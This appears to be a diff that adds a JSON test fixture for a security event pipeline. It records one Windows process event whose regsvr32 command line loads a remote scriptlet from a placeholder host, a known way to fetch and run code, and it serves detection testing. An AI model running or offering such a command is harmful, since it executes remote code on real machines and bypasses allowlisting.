@@ -1,0 +1,22 @@
+{
+  "event_id": "46b3aa30-a69a-4902-af57-27dcb845cea9",
+  "timestamp": "2026-01-01T00:00:00Z",
+  "event_category": "process",
+  "action": null,
+  "outcome": "success",
+  "source": "tests",
+  "source_type": "operating_system",
+  "actor": null,
+  "source_endpoint": null,
+  "destination_endpoint": null,
+  "process": {
+    "name": "regsvr32.exe",
+    "pid": null,
+    "command_line": "regsvr32.exe /s /n /u /i:http://px.example/scrobj.dll",
+    "executable": "C:\\Windows\\System32\\regsvr32.exe",
+    "parent_process": null
+  },
+  "file": null,
+  "normalized_data": {},
+  "provenance": "observed"
+}
